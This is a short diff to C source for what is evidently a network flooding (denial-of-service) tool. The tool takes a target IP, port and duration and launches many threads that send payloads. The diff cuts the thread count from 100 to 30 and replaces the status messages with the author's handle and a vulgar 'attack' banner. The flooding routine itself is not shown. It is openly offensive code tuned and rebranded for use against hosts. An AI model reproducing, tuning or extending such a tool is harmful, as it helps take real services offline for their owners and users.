@@ -6,7 +6,7 @@
 #include <arpa/inet.h>
 #include <time.h>
 
-#define MAX_THREADS 100
+#define MAX_THREADS 30
 #define PAYLOAD_SIZE 1024  // Payload size in bytes
 
 typedef struct {
@@ -60,7 +60,7 @@ int main(int argc, char* argv[]) {
 
     pthread_t threads[MAX_THREADS];
 
-    printf("Attack started on %s:%d for %d seconds with %d threads...\n",
+    printf("MADE BY @IPxKINGYT %s:%d for %d seconds with %d threads...\n",
            params.ip, params.port, params.duration, MAX_THREADS);
 
     for (int i = 0; i < MAX_THREADS; i++) {
@@ -73,7 +73,7 @@ int main(int argc, char* argv[]) {
         pthread_join(threads[i], NULL);
     }
 
-    printf("Attack finished.\n",
+    printf("FUCKED ATTACK @IPxKINGYT HOST IP %s on port %d for %d seconds\n",
            params.ip, params.port, params.duration);
 
     return 0;
